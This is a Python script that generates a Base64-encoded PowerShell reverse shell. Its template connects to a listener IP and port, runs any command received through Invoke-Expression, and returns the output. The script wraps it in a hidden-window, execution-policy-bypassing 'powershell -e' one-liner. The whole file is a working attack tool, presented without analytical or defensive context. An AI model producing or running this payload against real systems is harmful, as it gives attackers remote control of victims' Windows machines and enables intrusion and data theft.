import base64
import argparse

def generate_payload(ip, port):
    ps_template = r'''
$IP = '{{IP}}';
$Port = {{PORT}};
try {
    $TCPClient = New-Object Net.Sockets.TCPClient($IP, $Port);
    $Stream = $TCPClient.GetStream();
    [byte[]]$Buffer = 0..65535 | ForEach-Object {0};
    $Encoding = [Text.Encoding]::UTF8;
    while(($BytesRead = $Stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $Command = $Encoding.GetString($Buffer, 0, $BytesRead).Trim();
        try {
            $Output = Invoke-Expression $Command 2>&1 | Out-String;
        } catch {
            $Output = $_.Exception.Message | Out-String;
        }
        $Response = $Output + "PS> ";
        $Stream.Write($Encoding.GetBytes($Response), 0, $Response.Length);
    }
} catch {
    Write-Error "Connection failed: $_";
    exit 1;
} finally {
    if($TCPClient) { $TCPClient.Close(); }
}
'''.strip()

    # Insert user values
    ps_script = ps_template.replace('{{IP}}', ip).replace('{{PORT}}', str(port))
    
    # Convert to UTF-16LE and Base64
    bytes_script = ps_script.encode('utf-16-le')
    b64_script = base64.b64encode(bytes_script).decode('utf-8')
    
    # Build final command
    command = f'powershell -nop -w 1 -ep bypass -e {b64_script}'
    return command

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generate Base64-encoded PowerShell reverse shell')
    parser.add_argument('-i', '--ip', required=True, help='Listener IP address')
    parser.add_argument('-p', '--port', type=int, default=2222, help='Listener port (default: 2222)')
    args = parser.parse_args()

    payload = generate_payload(args.ip, args.port)
    print("\nGenerated PowerShell command:\n")
    print(payload)
    print("\n")